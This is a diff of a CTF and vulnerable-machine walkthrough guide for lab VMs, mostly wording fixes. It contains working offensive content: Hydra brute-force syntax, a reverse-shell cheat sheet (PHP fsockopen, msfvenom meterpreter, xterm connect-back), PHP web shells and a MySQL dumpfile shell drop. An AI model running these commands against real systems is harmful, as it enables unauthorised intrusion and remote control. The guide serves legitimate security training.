@@ -2,11 +2,13 @@
 CTF Series : Vulnerable Machines
 ********************************
 
-This post (Work in Progress) mark downs the learning gathered by doing the vulnerable machines provided by the `VulnHub <https://vulnhub.com>`_, `Hack the Box <https://hackthebox.eu>`_ and others. Once you download the virtual machine from the website and run it in VMware or Virtual Box, below steps could be followed to find the vulnerabilities.
+This post (Work in Progress [WIP]) records what we learned by doing vulnerable machines provided by `VulnHub <https://vulnhub.com>`_, `Hack the Box <https://hackthebox.eu>`_ and others. The steps below could be followed to find vulnerabilities, exploit these vulnerablities and finally become system/ root.
 
-We would like to **thank g0tm1lk** for maintaining **Vulnhub** and **moderators** of **HackTheBox**. Also, **shout-out** to each and every **author of the Vulnerable Machine/ write-ups** submitted. Thank you for providing awesome challenges to learn from and sharing your knowledge to the community! **Thank You!!**
+Once you download a virtual machines from `VulnHub <https://vulnhub.com>`_  you can run it by using virtualization software such as VMware or Virtual Box.
 
-In solving any vulnerable machine, there are few stages:
+We would like to **thank g0tm1lk** for maintaining **Vulnhub** and the **moderators** of **HackTheBox**. Also, **shout-outs** are in order for each and every **authors of Vulnerable Machines and/or write-ups**. Thank you for providing these awesome challenges to learn from and sharing your knowledge with the IT security community! **Thank You!!**
+
+You generally go through the following stages when solving a vulnerable machine:
 
 * :ref:`finding-the-ip-address`
 * :ref:`port-scanning`
@@ -14,7 +16,7 @@ In solving any vulnerable machine, there are few stages:
 * :ref:`from-nothing-to-unprivileged-shell`
 * :ref:`unprivileged-shell-to-privileged-shell`
 
-In this blog, we have mentioned, what can be done in each stages. Have also provided :ref:`tips-and-tricks` for solving the VMs. :doc:`LFF-IPS-P2-VulnerabilityAnalysis` could also be referred for exploitation of any particular services (i.e. it provides information such as "If you have found service X (like ssh, Apache tomcat, JBoss, iscsi etc.), how they can be exploited"). There are also appendixes related to :ref:`A1-Local-file-Inclusion` and :ref:`A2-File-Upload`
+On this blog, we have mentioned, what can be done in each stages. Furthermore, we have also provided :ref:`tips-and-tricks` for solving vulnerable VMs. Additionally :doc:`LFF-IPS-P2-VulnerabilityAnalysis` could be referred for exploitation of any particular services (i.e. it provides information such as "If you have identified service X (like ssh, Apache tomcat, JBoss, iscsi etc.), how they can be exploited"). Lastly there are also appendixes related to :ref:`A1-Local-file-Inclusion` and :ref:`A2-File-Upload`.
 
 .. _finding-the-ip-address:
 
@@ -31,13 +33,13 @@ An active/ passive arp reconnaissance tool
 ::
 
   netdiscover [options] 
-  -i interface : The network interface to sniff and inject packets. 
-  -r range : Scan a given range instead of auto scan.
+  -i interface : The network interface to sniff and inject packets on. 
+  -r range : Scan a given range instead performing an auto scan.
 
   Example: 
   netdiscover -i eth0/wlan0/vboxnet0/vmnet1 -r 192.168.1.0/24 
 	
-Interface name for Virtualization Software
+Interface names of common Virtualization Software:
 
 * Virtualbox : vboxnet 
 * Vmware     : vmnet 
@@ -52,7 +54,7 @@ Network exploration tool and security/ port scanner
   nmap [Scan Type] [Options] {target specification} 
   -sP/-sn Ping Scan -disable port scan 
 
-Example
+Example:
 
 ::
 
@@ -63,22 +65,24 @@ Example
 Port Scanning
 =============
 	
-Port scanning provides a large amount of information on open services and possible exploits that target these services. Three options: Unicornscan, nmap, netcat (when nmap is not available).
+Port scanning provides a large amount of information on open services and possible exploits that target these services. 
+
+Common port scanning software include: Unicornscan, nmap, netcat (when nmap is not available).
 
 Unicornscan
 -----------
 
-A port scanner that utilizes its own userland TCP/IP stack, which allows it to run a asynchronous scans. Faster than nmap and can scan 65,535 ports in a relatively shorter time frame. 
+A port scanner that utilizes its own userland TCP/IP stack, which allows it to run asynchronous scans. It can scan 65,535 ports in a relatively shorter time frame (faster than nmap). 
 
 ::  
 
    unicornscan [options] X.X.X.X/YY:S-E 
      -i, --interface : interface name, like eth0 or fxp1, not normally required 
      -m, --mode : scan mode, tcp (syn) scan is default, U for udp T for tcp \`sf' for tcp connect scan and A for arp for -mT you can also specify tcp flags following the T like -mTsFpU for example that would send tcp syn packets with (NO Syn\|FIN\|NO Push\|URG)
-     Address ranges are cidr like 1.2.3.4/8 for all of 1.?.?.?, if you omit the cidr mask then /32 is implied. 
-     Port ranges are like 1-4096 with 53 only scanning one port, a for all 65k and p for 1-1024
+     Address ranges are in cidr notation like 1.2.3.4/8 for all of 1.?.?.?, if you omit the cidr mask /32 is implied. 
+     Port ranges are like 1-4096 with 53 only scanning one port, **a** for all 65k and p for 1-1024
 
-    example: unicornscan 192.168.1.5:1-4000 gateway:a would scan port 1 - 4000 for 192.168.1.5 and all 65K ports for gateway.
+    example: unicornscan 192.168.1.5:1-4000 gateway:a would scan port 1 - 4000 for 192.168.1.5 and all 65K ports for the host named gateway.
 
 Nmap
 -----
@@ -91,7 +95,7 @@ Network exploration tool and security/ port scanner
 
   HOST DISCOVERY:
   -sL: List Scan - simply list targets to scan 
-  -sn: Ping Scan - disable port scan 
+  -sn/-sP: Ping Scan - disable port scan 
   -Pn: Treat all hosts as online -- skip host discovery
 
   SCAN TECHNIQUES: 
@@ -112,16 +116,16 @@ Network exploration tool and security/ port scanner
   MISC: -6: Enable IPv6 scanning -A: Enable OS detection, version detection, script scanning, and traceroute
 
 
-As unicornscan is so fast, it makes sense to use it for scanning large networks or a large number of ports. The idea is to use unicornscan to scan all ports, and make a list of those ports that are open and pass them to nmap for service detection. superkojiman has written a script for this available at `GitHub <https://github.com/superkojiman/onetwopunch>`_.
+As unicornscan is so fast, it makes sense to use it for scanning large networks or a large number of ports. The idea is to use unicornscan to scan all ports, and make a list of those ports that are open and pass them to nmap for service detection. Superkojiman has written a script for this available at `GitHub <https://github.com/superkojiman/onetwopunch>`_.
 
 netcat 
 ------
-Netcat might not be the best tool to use for port scanning, but can be used quickly. netcat scans TCP ports by default, but we can perform UDP scans as well.
+Netcat might not be the best tool to use for port scanning, but it can be used quickly. Netcat scans TCP ports by default, but we can perform UDP scans as well.
 
 TCP Scan
 ^^^^^^^^
 
-For a TCP scan, the format is
+For a TCP scan, the format is:
 
 ::
 
@@ -133,7 +137,7 @@ For a TCP scan, the format is
 UDP Scan
 ^^^^^^^^
 
-For a UDP Port Scan, we need to add -u flag which makes the format
+For a UDP Port Scan, we need to add -u flag which makes the format:
 
 ::
 
@@ -146,9 +150,9 @@ If we have windows machine without nmap, we can use `PSnmap <https://www.powersh
 Amap - Application mapper
 -------------------------
 
-When portscanning a host, you will be presented with a list of open ports. In many cases, the port number tells you what application is running. Port 25 is usually SMTP, port 80 mostly HTTP. However, this is not always the case, and especially when dealing with proprietary protocols running on non-standard ports you will not be able to determine what application is running.
+When portscanning a host, you will be presented with a list of open ports. In many cases, the port number tells you what application is running. Port 25 is usually SMTP, port 80 mostly HTTP. However, this is not always the case, and especially when dealing with proprietary protocols running on non-standard ports you will not be able to determine which application is running.
 
-By using **amap**, we can identify if any SSL server is running on port 3445 or some oracle listener on port 23. Also, it will actually do an SSL connect if you want and then try to identify the SSL-enabled protocol! One of the VM in vulnhub was running http and https on the same port.
+By using **amap**, we can identify which services are running on a given port. For example is there a SSL server running on port 3445? or some oracle listener on port 23?. Note that the application can also handle services that requies SSL. Herefore it will perform an SSL connect following by trying to identify the SSL-enabled protocol!  One of the vulnhub VM's for example was running http and https on the same port.
 
 ::
 
@@ -166,16 +170,17 @@ By using **amap**, we can identify if any SSL server is running on port 3445 or 
 Rabbit Holes?
 =============
 
-There would be instances where you are not able to find anything such as any open port or any entry point. The below may provide some clue.
+There will be instances when we will not able to find anything entry point such as any open port. The section below may provide some clues how to get unstuck.
 
 .. _listen-to-the-interface:
 
 Listen to the interface
 ------------------------
 
-We should always listen to the local interface on which the VM is hosted such as vboxnet0 or vmnet using wireshark or tcpdump. Many VMs send data randomly, for example, In one of the VM, it does the arp scan and sends a SYN packet on the port 4444, if something is listening on that port, it send the data.
+Many VMs send data on random ports therefore we recommend to listen to the local interface (vboxnet0 / vmnet) on which the VM is running. This can be done by using wireshark or tcpdump. For example, one of the vulnhub VMs, performs an arp scan and sends a SYN packet on port 4444, if something is listening on that port, it sends some data.
 
 :: 
+  tcpdump -I eth0
 
   18:02:04.096292 IP 192.168.56.101.36327 > 192.168.56.1.4444: Flags [S], seq 861815232, win 16384, options [mss 1460,nop,nop,sackOK,nop,wscale 3,nop,nop,TS val 4127458640 ecr 0], length 0
   18:02:04.096330 IP 192.168.56.1.4444 > 192.168.56.101.36327: Flags [R.], seq 0, ack 861815233, win 0, length 0
@@ -183,7 +188,7 @@ We should always listen to the local interface on which the VM is hosted such as
   18:02:04.100773 ARP, Request who-has 192.168.56.3 tell 192.168.56.101, length 28
   18:02:04.096292 IP 192.168.56.101.36327 > 192.168.56.1.4444: Flags [S],
 
-While listening on port 4444, we might receive a something like a base64 encoded string or some message.
+While listening on port 4444, we might receive something like a base64 encoded string or some message.
 
 ::
 
@@ -196,7 +201,7 @@ While listening on port 4444, we might receive a something like a base64 encoded
 DNS Server
 ----------
 
-If the targeted machine is running a DNS Server and we have possible domain name, we may try to figure out A, MX, AAAA records or try zone-transfer to figure out other possible domain names.
+If the targeted machine is running a DNS Server and we have a possible domain name, we may try to figure out A, MX, AAAA records or try zone-transfer to figure out other possible domain names.
 
 ::
 
@@ -208,11 +213,15 @@ If the targeted machine is running a DNS Server and we have possible domain name
  host -t soa <domain>               -- Start of Authority
  host <IP>                          -- Reverse Lookup
  host -l <Domain Name> <DNS Server> -- Domain Zone Transfer
+ 
+ **todo add output example**
 
 SSL Certificate
 ---------------
 
-If the targetted machine is running https server and we are getting a apache default webpage on hitting the https://IPAddress, probably, check the alt-dns-name on the ssl-certificate, create a entry in /etc/hosts and browse with the https://alt-dns-name.
+If the targetted machine is running an https server and we are getting a apache default webpage on hitting the https://IPAddress. vhosts are probably in use. Check the alt-dns-name on the ssl-certificate, create an entry in hosts file ( /etc/hosts ) and check what is being hosted on these domain names by surfing to https://alt-dns-name.
+
+nmap service scan result for port 443 (sample)
 
 ::
 
@@ -225,14 +234,14 @@ If the targetted machine is running https server and we are getting a apache def
 From Nothing to a Unprivileged Shell
 ====================================
 
-At this point, we would have an idea about the different services and service version running on the system. (aka figure out what webservices such as cms or software's are running on the vulnerable machine)
+At this point, we would have an idea about the different services and service version running on the system. Besides the output given by the nmap. It is also recommended to check what software is being used on the webservers (eg certain cms's)
 
 searchsploit
 ------------
 
 Exploit Database Archive Search
 
-First, we need to check if the operating system is using any services which are vulnerable or the exploit is already available in the internet. For example, A vulnerable service webmin is present in one of the VM which can be exploited to extract information from the system.
+First, we check if the operating system and/ or the exposed services are vulnerable to exploits which are already available on the internet. For example, a vulnerable service webmin is present in one of the VM which could be exploited to extract information from the system.
 
 ::
 
@@ -245,7 +254,7 @@ First, we need to check if the operating system is using any services which are 
   |_  ERROR: Failed to get host information from server
   **********Trimmed**************
 
-If we search for webmin in searchsploit, we will find different exploits available for it and we just have to use the correct one based on the utility and the version matching.
+If we search for webmin with searchsploit, we will find different exploits available for it and we just have to use the correct one based on utility and the version matching.
 
 ::
 
@@ -265,7 +274,7 @@ Once we have figured out which exploit to check we can read about it by using th
  searchsploit -x 24674
 
 
-Searchsploit even provide an option to read the nmap XML file and suggest vulnerabilities (Need nmap -sV -x xmlfile).
+Searchsploit even provide an option to read the nmap XML file and suggest vulnerabilities ( Requires nmap -sV -x xmlfile ).
 
 ::
   
@@ -274,27 +283,27 @@ Searchsploit even provide an option to read the nmap XML file and suggest vulner
                               Use "-v" (verbose) to try even more combinations
 
 
-.. Tip :: If we don't get a exact exploit for a version, it is also recommended to read the exploits which are highlighted as they may be valid for lower versions too. For example Let's say we are searching for exploits in Example_Software version 2.1.3. However, version 2.2.2 contains multiple vulnerablities. Reading the description for 2.2.2 we find out it's valid for lower versions too.
+.. Tip :: If we don't manage to find an exploit for a specific version, it is recommended to check the notes of the exploits which are highlighted as they may be valid for lower versions too. For example Let's say we are searching for exploits in Example_Software version 2.1.3. However, version 2.2.2 contains multiple vulnerablities. Reading the description for 2.2.2 we find out it's valid for lower versions too.
 
 SecLists.Org Security Mailing List Archive
 ------------------------------------------
 
-There would be some days, when you won't find vulnerability in searchsploit. We should also check the `seclists.org security mailing list google search <http://seclists.org/>`_, if someone has reported any bug for that particular software. 
+There will be some days, when you won't find vulnerability with searchsploit. In this case, we should also check the `seclists.org security mailing list google search <http://seclists.org/>`_, if someone has reported any bug for that particular software that we can exploit. 
 
 Google-Vulns
 ------------
 
-It is suggested that whenever you are googling something,  also try with the words such as ctf, github, python, tool etc. For example. Let's say, you are stuck in a docker or in a specific cms. Search for docker ctf or <cms_name> ctf/ github etc.
+It is suggested that whenever you are googling something,  you add words such as vulnerability, exploit, ctf, github, python, tool etc. to your searchterm. For example. Let's say, you are stuck in a docker or on a specific cms search for docker ctf or <cms_name> ctf/ github etc.
 
 Webservices
 -----------
 
-If a webserver is running on the machine, we can start with running 
+If a webserver is running on a machine, we can start with running 
  
 whatweb
 ^^^^^^^
 
-Utilize whatweb to find what server is running.
+Utilize whatweb to find what software stack a server is running.
 
 ::
 
@@ -304,7 +313,9 @@ Utilize whatweb to find what server is running.
 
 nikto
 ^^^^^
-nikto - Scan web server for known vulnerabilities. It would examine a web server to find potential problems and security vulnerabilities, including:
+nikto - Scans a web server for known vulnerabilities. 
+
+It will examine a web server to find potential problems and security vulnerabilities, including:
 
 * Server and software misconfigurations
 * Default files and programs
@@ -314,20 +325,20 @@ nikto - Scan web server for known vulnerabilities. It would examine a web server
 dirb, wfuzz, dirbuster
 ^^^^^^^^^^^^^^^^^^^^^^
 
-Further, we can execute to find any hidden directories.
+Furthermore, we can run the folling programs to find any hidden directories.
 
-* `DIRB <https://tools.kali.org/web-applications/dirb>`_ is a Web Content Scanner. It looks for existing (and/or hidden) Web Objects. It basically works by launching a dictionary basesd attack against a web server and analizing the response.
-* `wfuzz <https://tools.kali.org/web-applications/wfuzz>`_ - a web application bruteforcer. Wfuzz might be useful when you are looking for webpage of a certain size. For example: Let's say, when we dirb we get 50 directories. Each directory containing a image. Most of the time, now we need to figure out which image is different. Here, we would figure out what's the size of the normal image and hide that particular response with wfuzz.
+* `DIRB <https://tools.kali.org/web-applications/dirb>`_ is a Web Content Scanner. It looks for existing (and/or hidden) Web Objects. It basically works by launching a dictionary based attack against a web server and analizing the response.
+* `wfuzz <https://tools.kali.org/web-applications/wfuzz>`_ - a web application bruteforcer. Wfuzz might be useful when you are looking for webpage of a certain size. For example: Let's say, when we dirb we get 50 directories. Each directory containing an image. Most of the time, we then need to figure out which image is different. In this case, we would figure out what's the size of the normal image and hide that particular response with wfuzz.
 * `Dirbuster <https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project>`_ : DirBuster is a multi threaded java application designed to brute force directories and files names on web/ application servers. 
 
-.. Tip :: Probably, we would be using common.txt in /usr/share/wordlists/dirb/ . If it's doesn't find anything, it's better to double check with /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt which is list of directories that where found on at least 2 different hosts when DirBuster project crawled the internet. Even if that doesn't work out, try searching with extensions .txt, .js, .html, .php. (.txt by default and rest application based)
+.. Tip :: Probably, we will be using common.txt (/usr/share/wordlists/dirb/) . If it's doesn't find anything, it's better to double check with /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt which is a list of directories that where found on at least 2 different hosts when DirBuster project crawled the internet. Even if that doesn't work out, try searching with extensions such as .txt, .js, .html, .php. (.txt by default and rest application based)
 
-.. Tip :: If the using the dirb/ wfuzz wordlist doesn't result in any directories and the website contains a lot of text, it might be a good idea to use cewl to create a wordlist and utilize that as a dictionary to find hidden directories.
+.. Tip :: If using the dirb/ wfuzz wordlist doesn't result in any directories and the website contains a lot of text, it might be a good idea to use cewl to create a wordlist and utilize that as a dictionary to find hidden directories.
 
 BurpSuite Spider
 ^^^^^^^^^^^^^^^^
 
-There would be some cases where dirb/ dirbuster won't find anything. Happened with us on a Node.js web application. Burpsuite spider helped in finding extra-pages which contained the credentials.
+There will be some cases when dirb/ dirbuster doesn't find anything. This appened with us on a Node.js web application. Burpsuite's spider helped in finding extra-pages which contained the credentials.
 
 
 Parameter Fuzz?
@@ -347,13 +358,15 @@ Now, this "/example" might be a php or might be accepting a GET Parameter. In th
 
 The other things which may try is putting a valid command such as 'ls, test' so it becomes FUZZ=ls or FUZZ=test
 
+**TODO: gobuster ??**
 
 PUT Method
 ^^^^^^^^^^
 
-Sometimes, it is also a good option to check for the various OPTIONS available on the website such as GET, PUT, DELETE etc.
+Sometimes, it is also a good option to check for the various HTTP verbs that are availble such as GET, PUT, DELETE, etc.
+This can be done by making an OPTIONS request.
 
-Curl command can be used to check the options available:
+Curl can be used to check the available options (supported http verbs):
 
 ::
 
@@ -376,9 +389,9 @@ Curl command can be used to check the options available:
   <
   * Connection #0 to host 192.168.126.129 left intact
 
-The put method allows you to upload a file. Eventually, you can upload a php file which can work as a shell. There are multiple methods to upload the file as mentioned in `Detecting and exploiting the HTTP Put Method <http://www.smeegesec.com/2014/10/detecting-and-exploiting-http-put-method.html>`_ 
+The PUT method allows you to upload a file. Which can help us to get a shell on the machine. There are multiple methods avaialble for uploading a file with the PUT method mentioned on `Detecting and exploiting the HTTP Put Method <http://www.smeegesec.com/2014/10/detecting-and-exploiting-http-put-method.html>`_ 
 
-The few are
+A few are:
 
 * Nmap:
 
@@ -401,7 +414,7 @@ The few are
 Wordpress
 ^^^^^^^^^
 
-When running wpscan, also make sure you run \-\-enumerate u for enumerating usernames. By default wpscan doesn't run it. Also, scan for plugins
+When faced with a website that makes use of the wordpress CMS one can run wpscan. Make sure you run \-\-enumerate u for enumerating usernames because by default wpscan doesn't run it. Also, scan for plugins
 
 ::
 
@@ -422,7 +435,7 @@ When running wpscan, also make sure you run \-\-enumerate u for enumerating user
     	Multiple values are allowed : "-e tt,p" will enumerate timthumbs and plugins
     	If no option is supplied, the default is "vt,tt,u,vp"
 
-Wordpress configuration is stored in wp-config.php. If you are able to download it, you might get username and password to database. We can also use wordpress to bruteforce password for a username 
+We can also use wpscan to bruteforce password for a username 
 
 ::
 
@@ -431,7 +444,8 @@ Wordpress configuration is stored in wp-config.php. If you are able to download 
 Tips
 
 * If we have found a username and password of wordpress with admin privileges, we can upload a php meterpreter. One of the possible way is to do Appearance > Editor > Possibly edit 404 Template.
-* If there's exists a SQL-Injection, by which we are able to extract wordpress user and password hash. However, password hash is not crackable. Probably, check the wp-posts table as it might contain some hidden posts.
+* The configuration of worpdress is normally speaking stored in wp-config.php. If you are able to download it, you might be luckiy and be able to loot plaintext username and passwords to database or wp-admin page. 
+* If the website is vulnerable for SQL-Injection. We should be able to extract the wordpress users and their password hashes. However, if the password hash is not crackable. Probably, check the wp-posts table as it might contain some hidden posts.
 * Got wordpress credentials, may be utilize `WPTerm <https://wordpress.org/plugins/wpterm/>`_ xterm-like plugin. It can be used to run non-interactive shell commands from the WordPress admin dashboard.
 * If their's a custom plugin created, probably, it would be in the location
 
@@ -439,12 +453,14 @@ Tips
 
    http://IP/wp-content/plugins/custompluginname
 
+**todo: elborate more on wp scanning and vulnerabilities?**
 
-
-Names? Possible Usernames? Possible Passwords?
-^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Names? Possible Usernames & Passwords?
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    
-Sometimes, on visiting the webpage of the webserver (If Vulnerable machine is running any http/ https webserver), you would find possible  names of the employees working in the company. Now, it is common practice to have username based on your first/ last name. Superkojiman has written a script `namemash.py <https://gist.githubusercontent.com/superkojiman/11076951/raw/8b0d545a30fd76cb7808554b1c6e0e26bc524d51/namemash.py>`_ which could be used to create possible usernames. However, we still have a large amount of  usernames to bruteforce with passwords. Further, if the vulnerable machine is running a SMTP mail server, we can verify if the particular username exists or not and modify namemash.py to generate usernames for that pattern.
+Sometimes, when visiting webpages, you will find possible names of the employees working in the company. It is common practice to have a username based on your first/ last name. Superkojiman has written a script `namemash.py <https://gist.githubusercontent.com/superkojiman/11076951/raw/8b0d545a30fd76cb7808554b1c6e0e26bc524d51/namemash.py>`_ which could be used to create possible usernames. However, then we are left with a large amount of potential usernames with no passwords.
+
+If the vulnerable machine is running a SMTP mail server, we can verify if the particular username exists or not and modify namemash.py to generate usernames for that pattern.
 
 * Using metasploit smtp\_enum module: Once msfconsole is running, use auxiliary/scanner/smtp/smtp\_enum, enter the RHOSTS (target address) and USER FILE containing the list of probable user accounts.
 * Using VRFY command:
@@ -457,8 +473,8 @@ Hydra can be used to brute force login web pages
 
 ::
 
-  -l LOGIN or -L FILE login with LOGIN name, or load several logins from FILE
-  -p PASS  or -P FILE try password PASS, or load several passwords from FILE
+  -l LOGIN or -L FILE login with LOGIN name, or load several logins from FILE  (userlist)
+  -p PASS  or -P FILE try password PASS, or load several passwords from FILE  (passwordlist)
   -U        service module usage details
   -e nsr additional checks, "n" for null password, "s" try login as pass, "r" try the reverse login as pass
 
@@ -479,18 +495,18 @@ The parameters take three ":" separated values, plus optional values.
   Syntax:   <url>:<form parameters>:<condition string>[:<optional>[:<optional>]
 
 * First is the page on the server to GET or POST to (URL).
-* Second is the POST/GET variables (taken from either the browser, proxy, etc. with usernames and passwords being replaced in the "^USER^" and "^PASS^" placeholders (FORM PARAMETERS)
+* Second is the POST/GET variables (taken from either the browser, proxy, etc. with usernames and passwords being replaced with the "^USER^" and "^PASS^" placeholders (FORM PARAMETERS)
 * Third is the string that it checks for an *invalid* login (by default) Invalid condition login check can be preceded by "F=", successful condition login check must be preceded by "S=". This is where most people get it wrong. You have to check the webapp what a failed string looks like and put it in this parameter!
 * The following parameters are optional:
   C=/page/uri     to define a different page to gather initial cookies from
-  (h|H)=My-Hdr\: foo   to send a user defined HTTP header with each request	^USER^ and ^PASS^ can also be put into these headers!
+  (h|H)=My-Hdr\: foo   to send a user defined HTTP header with each request ^USER^ and ^PASS^ can also be put into these headers!
 
  * Note: 
 
-  * 'h' will add the user-defined header at the end	regardless it's already being sent by Hydra or not.
+  * 'h' will add the user-defined header at the end regardless it's already being sent by Hydra or not.
   * 'H' will replace the value of that header if it exists, by the one supplied by the user, or add the header at the end
 
- * Note that if you are going to put colons (:) in your headers you should escape them with a backslash (\). All colons that are not option separators should be escaped (see the examples above and below). You can specify a header without escaping the colons, but that way you will not be able to put colons in the header value itself, as they will be interpreted by hydra as option separators.
+ * Note that if you are going to put colons (:) in your headers you should escape them with a backslash (\). All colons that aren't option separators should be escaped (see the examples above and below). You can specify a header without escaping the colons, but that way you will not be able to put colons in the header value itself, as they will be interpreted by hydra as option separators.
 
 Examples:
 
@@ -502,11 +518,12 @@ Examples:
  "/:user=^USER&pass=^PASS^:failed:H=Authorization\: Basic dT1w:H=Cookie\: sessid=aaaa:h=X-User\: ^USER^"
  "/exchweb/bin/auth/owaauth.dll:destination=http%3A%2F%2F<target>%2Fexchange&flags=0&username=<domain>%5C^USER^&password=^PASS^&SubmitCreds=x&trusted=0:reason=:C=/exchweb"
 
+**TODO ncrack?**
 
 Reverse Shells
 --------------
 
-Possibly, we would have figured out some vulnerablity in the services running or misconfiguration and can have a reverse shell using netcat, php, weevely, ruby, perl, python, java, jsp, bash tcp, Xterm, Lynx, Mysql. Mostly taken from `PentestMonkey Reverse shell cheat sheet <http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet>`_  and `Reverse Shell Cheat sheet from HighOn.Coffee <https://highon.coffee/blog/reverse-shell-cheat-sheet/>`_ and some more.
+Possibly, we would have figured out some vulnerablity or misconfiguration in the running services which allows us to have a reverse shell using netcat, php, weevely, ruby, perl, python, java, jsp, bash tcp, Xterm, Lynx, Mysql. Mostly taken from `PentestMonkey Reverse shell cheat sheet <http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet>`_  and `Reverse Shell Cheat sheet from HighOn.Coffee <https://highon.coffee/blog/reverse-shell-cheat-sheet/>`_ and more.
 
 netcat (nc)
 ^^^^^^^^^^^
@@ -546,7 +563,7 @@ PHP
 
    <? passthru($_GET["cmd"]); ?>
 
- which can be accessed by
+ which can then be accessed by
 
  :: 
 
@@ -580,19 +597,21 @@ PHP
 
  We can create a php meterpreter shell, run a exploit handler on msf, upload the payload on the server and wait for the connection.
 
+**todo explain how to set up a multi handler**
+
  ::
 
   msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f raw -o /tmp/payload.php
 
 * **PHP Reverse Shell**
 
- PHP Trick: This code assumes that the TCP connection uses file descriptor 3. This worked on my test system. If it doesn’t work, try 4, 5, 6
+ The code below assumes that the TCP connection uses file descriptor 3. This worked on my test system. If it doesn’t work, try 4, 5, 6
 
  :: 
 
   php -r '$sock=fsockopen("192.168.56.101",1337);exec("/bin/sh -i <&3 >&3 2>&3");'
 
- The above can be connected by listening at port 1337 by using nc
+ The above can be connected to by listening on port 1337 by using nc
 
 Weevely
 ^^^^^^^
@@ -609,7 +628,7 @@ which can be called by
 
   weevely http://192.168.1.2/location_of_payload password
 
-However, it wasn't as useful as php meterpreter or reverse shell.
+However, it wasn't as useful as php meterpreter or a reverse shell.
 
 
 Ruby
@@ -735,7 +754,7 @@ Telnet Reverse Shell
 XTerm
 ^^^^^
 
-One of the simplest forms of reverse shell is an xterm session. The following command should be run on the server. It will try to connect back to you (10.0.0.1) on TCP port 6001.
+One of the simplest forms of reverse shell is an xterm session. The following command should be run on the victim server. It will try to connect back to you (10.0.0.1) on TCP port 6001.
 
 .. code-block :: bash 
 
@@ -757,7 +776,8 @@ You’ll need to authorize the target to connect to you (command also run on you
 Lynx
 ^^^^
 
-Obtain an interactive shell through lynx: It is possible to obtain an interactive shell via special LYNXDOWNLOAD URLs. This is a big security hole for sites that use lynx "guest accounts" and other public services. More details `LynxShell <http://insecure.org/sploits/lynx.download.html>`_ 
+Obtain an interactive shell through lynx: It is possible to obtain an interactive shell via special LYNXDOWNLOAD URLs. 
+This is a big security hole for sites that use lynx "guest accounts" and other public services. More details `LynxShell <http://insecure.org/sploits/lynx.download.html>`_ 
 
 When you start up a lynx client session, you can hit "g" (for Goto) and then enter the following URL:
 
@@ -781,7 +801,7 @@ MYSQL
  
   SELECT "<?php passthru($_GET['cmd']); ?>" into dumpfile '/var/www/html/shell.php';
 
-* If you have sql-shell from sqlmap/ phpmyadmin, we can use
+* If you have sql-shell from sqlmap/ phpmyadmin, we can read files by using the load_file function.
 
  :: 
 	
@@ -793,7 +813,7 @@ Reverse Shell from Windows
 If there's a way, we can execute code from windows, we may try
 
 * Powershell Empire/ Metasploit Web-Delivery Method
-* Invoke-Shellcode 
+* Invoke-Shellcode (from powersploit)
 
  ::
 
@@ -976,7 +996,6 @@ Probably will get
  standard in must be a tty
 
 The su command would work from a terminal, however, would not take in raw stuff via the shell's Standard Input.
-
 We can use a shell terminal trick that relies on Python to turn our non-terminal shell into a terminal shell
 
 ::
@@ -991,7 +1010,7 @@ Spawning a Fully Interactive TTYs Shell
 
 `Ronnie Flathers <https://twitter.com/ropnop>`_ has already written a great blog on `Upgrading simple shells to fully interactive TTYs <https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/>`_ Hence, almost everything is taken from that blog and kept here for completion purposes.
 
-Many times, we would not get a fully interactive shell which means 
+Many times, we will not get a fully interactive shell therefore it will/ have: 
 
 * Difficult to use the text editors like vim
 * No tab-complete
@@ -1017,7 +1036,7 @@ On Victim (launch):
 
 If socat isn't installed, download standalone binaries that can be downloaded from `static binaries <https://github.com/andrew-d/static-binaries>`_ 
 
-Download the correct architecture socat binary to a writable directoy, chmod it, then execute
+Download the correct binary architecture of socat to a writable directoy, chmod it, execute
 
 stty
 ^^^^
@@ -1025,8 +1044,7 @@ stty
 Use the methods mentioned in :ref:`spawning-a-tty-shell`
 
 Once bash is running in the PTY, background the shell with Ctrl-Z
-
-While the shell is in the background, now examine the current terminal and STTY info so we can force the connected shell to match it
+While the shell is in the background, examine the current terminal and STTY info so we can force the connected shell to match it
 
 ::
  
@@ -1043,10 +1061,9 @@ While the shell is in the background, now examine the current terminal and STTY 
  opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
  isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc
 
-
 The information needed is the TERM type ("xterm-256color") and the size of the current TTY ("rows 38; columns 116")
 
-With the shell still backgrounded, now set the current STTY to type raw and tell it to echo the input characters with the following command:
+With the shell still backgrounded, set the current STTY to type raw and tell it to echo the input characters with the following command:
 
 ::
 
